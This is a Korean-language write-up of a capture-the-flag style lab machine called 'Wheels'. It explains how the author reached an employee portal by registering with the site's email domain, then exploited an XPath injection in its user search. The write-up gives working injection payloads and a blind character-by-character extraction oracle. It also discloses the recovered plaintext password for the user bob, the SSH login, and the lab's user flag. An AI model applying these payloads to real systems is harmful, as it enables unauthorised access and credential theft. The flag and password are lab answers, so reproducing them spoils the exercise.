# Wheels (192.168.248.202) — 웹 진입점 규명

## 결론
- **진입점**: Employee Portal 의 "Filter Users By Services" 검색 기능 → **XPath injection** (`SimpleXMLElement::xpath()`, `/var/www/html/portal.php:68`).
- **셸**: XPath 로 XML 사용자 저장소에서 **평문 비밀번호** 추출 → SSH `bob`.
- **user flag**: `dad9316cbb189a7deeeaf3106eaf489d` (`~/local.txt`, SSH 대화형 셸에서 원위치 cat, `~/PG/Wheels/proof_user.txt` 저장).

## 핵심 — 앞 러너가 못 넘은 벽을 넘은 지점
앞 러너는 **Employee Portal 에 들어가지 못해** 검색 기능(=진짜 취약점)을 아예 보지 못했다.
포털 접근 게이트는 **가입 이메일 도메인**이다:
- register.php 에 `email=<임의>@wheels.service` 로 가입하면 로그인 시 세션에 employee 권한이 붙는다.
- 사이트 푸터의 `info@wheels.service` 가 도메인 단서.
- 이메일은 UNIQUE 라 도메인당 로컬파트만 바꾸면 무한 발급.
- (일반 이메일로 가입한 계정은 portal.php 가 `<h1>Access Denied</h1>` 23바이트만 반환)

## XPath injection 상세
- 포털 로그인 후: `GET /portal.php?work=<val>&action=search`
- 서버 쿼리 구조: `//user[contains(service,'<work>')]` (단일따옴표 컨텍스트)
  - `work=car'` → `Warning: SimpleXMLElement::xpath(): Invalid expression ... portal.php on line 68` (홀수 따옴표로 확정)
  - 결과 노드마다 화면에 **자식 2개(id, employee)** 를 표로 출력. 앱은 결과 없으면 `XML Error; No <work> entity found` + `No users were found!` 출력.
- **전체 사용자 덤프**: `work = x') or ('1'='1`
  → `//user[contains(service,'x') or ('1'='1')]` → 6명 전원:
  bob, alice, john (car) / dan, alex, selene (bike)
- **필드 구조**(오라클 blind): 사용자명 요소는 `username` 이 아니라 **`employee`**.
  bob 노드 자식 4개: `id`, `employee`, `password`(평문), `service`.
- **blind 오라클 페이로드**:
  `work = zzz') or (*='bob' and (<COND>)) or ('1'='2`
  결과에 대상 사용자명이 나타나면 COND 참. `substring(*[3],i,1)='c'` 로 password 한 글자씩 추출.

## 추출된 자격증명
- `bob : Iamrockinginmyroom1212` → **SSH 성공** (uid=1000, groups=1000(bob) 뿐, `bob may not run sudo`)
- 나머지 5명(alice/john/dan/alex/selene) 비번은 동일 방식으로 추출 가능(미추출). `/home` 에는 bob 홈만 존재 → 나머지는 SSH 계정 아닐 가능성.

## 앞 러너 배제를 반증한 것
- "BLOCK: bob 비번은 bcrypt, 온라인 브루트 불가" → **맞다. 하지만 우회 불필요.** DB 의 bcrypt 와 별개로 **포털이 참조하는 XML 저장소에 평문 비번**이 있었다. 크랙이 아니라 XPath injection 으로 그대로 읽었다.
- rockyou top-1500 미탐도 당연(비번이 `Iamrockinginmyroom1212` — 워드리스트 밖 문장형).

## 재현 요약(3줄)
1. `register.php` 에 `email=x@wheels.service` 로 가입 → `login.php` → employee 세션.
2. `GET /portal.php?work=x') or ('1'='1&action=search` 로 사용자 열거, blind 로 `password` 필드 추출.
3. `ssh bob@192.168.248.202` (Iamrockinginmyroom1212) → `cat ~/local.txt`.

## 산출물 (Kali ~/PG/Wheels/)
- `dump2.py` — XML 구조/값 blind 추출기
- `dump.py`, `oracle.py`, `xpath.py` — 페이로드 탐색 과정
- `proof_user.txt` — user flag

## 남은 것 (privesc — 별개 단계)
- bob sudo 불가. 로컬 열거 필요(SUID/cron/캡ability/포털 소스의 다른 취약점). 이 작업 범위 밖.
